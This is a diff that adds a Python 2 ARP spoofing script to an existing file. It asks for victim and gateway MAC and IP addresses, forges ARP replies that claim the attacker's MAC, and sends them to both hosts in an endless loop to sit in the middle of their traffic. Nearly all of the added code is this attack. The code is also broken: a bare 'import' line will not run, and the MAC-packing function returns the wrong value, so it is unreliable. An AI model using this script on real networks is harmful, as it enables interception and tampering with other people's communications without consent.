@@ -111,3 +111,48 @@ try:
 	sleep(slptime)
 except KeyboardInterrupt:
     pass
+    
+############# Code that i write ###################
+
+__author__ = 'n4rut0'
+
+import socket
+import
+import binascii,time
+import struct
+
+s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.ntohs(0x800))
+s.bind(("Wi-Fi",socket.htons(0x800)))
+
+def pack_addr(ipadr):
+    pkaddr = socket.inet_aton(ipadr)
+    return pkaddr
+def pack_mac(macadr):
+    mcaddr = macadr.replace(":","").decode('hex')
+    return macadr
+
+sorc = pack_mac(raw_input("Input your MAC Address : "))
+vicmac = pack_mac(raw_input("Input MAC Address victim : "))
+gatemac = pack_mac(raw_input("Input MAC Address gateway : "))
+vicip = pack_addr(raw_input("Input IP Address victim : "))
+gateip = pack_addr(raw_input("Input IP Address gateway : "))
+
+arp_code = '\x08\x06'
+eth1 = vicmac + sorc + arp_code
+eth2 = gatemac + sorc + arp_code
+
+htype = '\x00\x01'
+protype = '\x08\x00'
+hsize = '\x06'
+psize = '\x04'
+opcode = '\x00\x02'
+
+arp_victim = eth1 + htype + protype + hsize + psize + opcode + sorc + gateip + vicmac + vicip
+arp_gateway = eth2 + htype + protype + hsize + psize + opcode + sorc + vicip + gatemac + gateip
+
+while True:
+    time.sleep(3)
+    s.send(arp_victim)
+    s.send(arp_gateway)
+
+
